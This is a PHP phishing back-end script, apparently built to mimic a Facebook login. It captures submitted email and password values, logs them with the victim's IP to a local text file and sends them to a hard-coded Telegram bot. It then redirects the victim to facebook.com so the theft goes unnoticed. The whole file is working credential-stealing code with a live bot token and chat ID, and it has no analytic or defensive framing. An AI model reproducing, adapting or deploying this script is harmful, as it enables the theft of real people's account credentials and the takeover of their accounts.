<?php
  date_default_timezone_set('Asia/Ho_Chi_Minh');
	function Getip(){
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
else
    {
      $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ip = Getip();
function usernames(){
  file_put_contents("usernames.txt", "Account: " . $_POST['email'] . "  Pass: " . $_POST['pass'] . "  IP: ". $ip . "  Time: " . date('H:i:s - d/m/Y') . "\n", FILE_APPEND);
  
}
usernames();

$name="co ten dang nhap: '". $_POST['email'] ."'". " va mat khau: '" . $_POST['pass']."'";

$botToken="5220868911:AAFucq9xnQFLrs4YLNpoSiLl7Nv7PrBvgVI";

  $website="https://api.telegram.org/bot".$botToken;
  $chatId=5245965113;
  $text="Doi tuong ". $name ." da dang nhap vao luc: ".date('H:i:s - d/m/Y');
  $params=[
      'chat_id'=>$chatId,
      'text'=>$text,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);






header('Location: https://facebook.com/');
exit();
